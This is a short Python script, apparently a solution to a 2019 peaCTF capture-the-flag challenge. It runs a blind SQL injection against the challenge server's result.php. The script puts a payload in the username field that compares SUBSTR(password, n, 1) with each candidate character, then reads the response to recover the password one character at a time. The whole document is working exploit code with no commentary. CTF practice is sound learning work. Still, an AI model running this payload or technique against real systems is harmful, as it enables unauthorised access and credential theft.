import requests
URL = "http://shell1.2019.peactf.com:10078/result.php"
characters = {'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','1','2','3','4','5','6','7','8','9','0'}

for num in range(1,9):
    for char in characters:
        r = requests.post(url = URL, data = {'answer':'blah','debug':1,'username':'\' OR SUBSTR(password, ' + str(num) + ', 1)=\'' + char + '\'--'})
        if 'security' in r.text:
            print(char)